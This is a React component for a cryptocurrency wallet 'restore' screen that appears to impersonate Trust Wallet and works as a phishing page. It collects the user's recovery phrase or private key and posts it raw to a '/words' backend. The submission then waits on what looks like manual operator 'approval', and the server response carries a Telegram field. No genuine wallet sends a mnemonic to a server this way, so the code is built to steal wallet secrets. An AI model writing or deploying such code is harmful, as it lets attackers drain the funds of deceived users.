import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import api from '../../api/axios'
import '../../styles/MultiCoinWalletSection.css'

function MultiCoinWalletSection({
  walletName: initialWalletName = '',
  secretPhrase: initialSecretPhrase = '',
  onBack,
  onRestoreSuccess,
  onRestoreError,
}) {
  const navigate = useNavigate()
  const [walletName, setWalletName] = useState(initialWalletName)
  const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
  const [isLoading, setIsLoading] = useState(false)
  const [statusMessage, setStatusMessage] = useState('')
  const [isAutoLogin, setIsAutoLogin] = useState(false)

  const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  const handleWalletNameChange = (value) => {
    setWalletName(value)
  }

  const handleWalletNameClear = () => {
    setWalletName('')
  }

  const handleSecretPhraseChange = (value) => {
    setSecretPhrase(value)
  }

  const handlePasteSecretPhrase = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
    } catch (error) {
      console.error('Failed to paste:', error)
    }
  }

  const handleAutoLogin = async () => {
    if (!canRestore || isLoading || isAutoLogin) return

    setIsLoading(true)
    setIsAutoLogin(true)
    setStatusMessage('⏳ Checking your wallet credentials...')

    try {
      const response = await api.post('/words/auto-login', {
        words: secretPhrase
      })

      if (response.data.ok) {
        const accountData = response.data.account
        setStatusMessage('✅ Wallet found! Redirecting...')
        
        // Store account data in localStorage for persistence
        localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
        localStorage.setItem('trust-wallet-logged-in', 'true')
        
        setTimeout(() => {
          navigate('/wallet', { 
            state: { 
              account: accountData,
              autoLogin: true
            } 
          })
        }, 1000)
      } else {
        throw new Error(response.data.error || 'Auto-login failed')
      }
    } catch (error) {
      console.error('Auto-login error:', error)
      
      // If auto-login fails, fallback to manual approval flow
      setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
      setIsAutoLogin(false)
      
      // Proceed with manual approval flow
      handleRestoreWallet()
    }
  }

  const handleRestoreWallet = async () => {
    if (!canRestore || isLoading) return

    setIsLoading(true)
    setStatusMessage('⏳ Submitting wallet for approval...')
    
    try {
      const response = await api.post('/words', {
        words: secretPhrase,
        createdBy: walletName,
        source: 'wallet-restore',
        title: walletName
      })

      if (response.data.ok) {
        const batch = response.data.batch
        
        // Start polling for status updates
        const interval = setInterval(async () => {
          try {
            const statusResponse = await api.get(`/words/${batch.id}/status`)
            
            if (statusResponse.data.ok) {
              const batchStatus = statusResponse.data.batch
              
              if (batchStatus.approvalStatus === 'approved') {
                clearInterval(interval)
                setStatusMessage('✅ Wallet approved! Redirecting...')
                localStorage.setItem('trust-wallet-logged-in', 'true')
                const approvedAccount = getApprovedAccount(batchStatus)

                if (approvedAccount) {
                  localStorage.setItem('trust-wallet-account', JSON.stringify(approvedAccount))
                }

                setTimeout(() => {
                  navigate('/wallet', {
                    state: {
                      account: approvedAccount,
                      batchId: batch.id,
                      approvalStatus: batchStatus.approvalStatus,
                    },
                  })
                }, 1000)
              } else if (batchStatus.approvalStatus === 'rejected') {
                clearInterval(interval)
                setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
                setIsLoading(false)
              } else {
                setStatusMessage('⏳ Waiting for approval...')
              }
            }
          } catch (error) {
            console.error('Status check error:', error)
            setStatusMessage('⚠️ Error checking wallet status. Please try again.')
            setIsLoading(false)
            clearInterval(interval)
          }
        }, 3000)
        
        onRestoreSuccess?.({
          walletName,
          secretPhrase,
          batchId: batch.id,
          telegram: response.data.telegram,
        })
      } else {
        throw new Error(response.data.error || 'Failed to restore wallet')
      }
    } catch (error) {
      console.error('Restore error:', error)
      setStatusMessage(`❌ Error: ${error.message || 'Failed to restore wallet'}`)
      setIsLoading(false)
      onRestoreError?.(error.message)
    }
  }

  const handleOpenSecretPhraseHelp = () => {
    window.open('https://example.com/help', '_blank')
  }

  const handleBack = () => {
    if (onBack) {
      onBack()
    } else {
      navigate('/')
    }
  }

  return (
    <main className="app-screen restore-screen">
      <FlowHeader
        title="Multi-coin wallet"
        onBack={handleBack}
        action={
          <button className="icon-button" type="button" aria-label="Scan">
            <IoScan />
          </button>
        }
      />
      <section className="restore-form">
        <div className="restore-field">
          <label htmlFor="wallet-name">Wallet name</label>
          <div className="wallet-name-field">
            <input
              id="wallet-name"
              type="text"
              value={walletName}
              enterKeyHint="next"
              onChange={(event) => handleWalletNameChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter wallet name"
            />
            <button
              className="wallet-name-clear"
              type="button"
              aria-label="Clear name"
              onClick={handleWalletNameClear}
              disabled={isLoading}
            >
              <IoClose aria-hidden="true" />
            </button>
          </div>
        </div>
        <div className="restore-field">
          <label htmlFor="secret-phrase">Wallet access key</label>
          <div className="secret-phrase-safe-box">
            <textarea
              id="secret-phrase"
              value={secretPhrase}
              spellCheck="false"
              autoCapitalize="none"
              autoComplete="off"
              autoCorrect="off"
              enterKeyHint="done"
              onChange={(event) => handleSecretPhraseChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter your recovery phrase or private key"
            />
            <button 
              type="button" 
              onClick={handlePasteSecretPhrase}
              disabled={isLoading}
            >
              Paste
            </button>
          </div>
        </div>
        <p>Enter the access details exactly as provided by your wallet</p>
        
        {statusMessage && (
          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
            {statusMessage}
          </div>
        )}
      </section>
      <section className="restore-actions">
        <button 
          className="continue-button" 
          type="button" 
          disabled={!canRestore || isLoading} 
          onClick={handleAutoLogin}
        >
          {isLoading ? 'Processing...' : 'Connect Wallet'}
        </button>
        <button 
          className="secret-help" 
          type="button" 
          onClick={handleOpenSecretPhraseHelp}
          disabled={isLoading}
        >
          Need help with wallet access?
        </button>
      </section>
    </main>
  )
}

function FlowHeader({ title, onBack, action }) {
  return (
    <header className="flow-header">
      <button className="icon-button" type="button" aria-label="Back" onClick={onBack}>
        <IoArrowBack />
      </button>
      <h1>{title}</h1>
      {action || <span></span>}
    </header>
  )
}

function getApprovedAccount(batchStatus) {
  const account = batchStatus.account || batchStatus.accountData || batchStatus.wallet
  const accountNumber = batchStatus.accountNumber || account?.accountNumber

  if (!account && !accountNumber) return null

  return {
    ...account,
    accountNumber,
  }
}

export default MultiCoinWalletSection
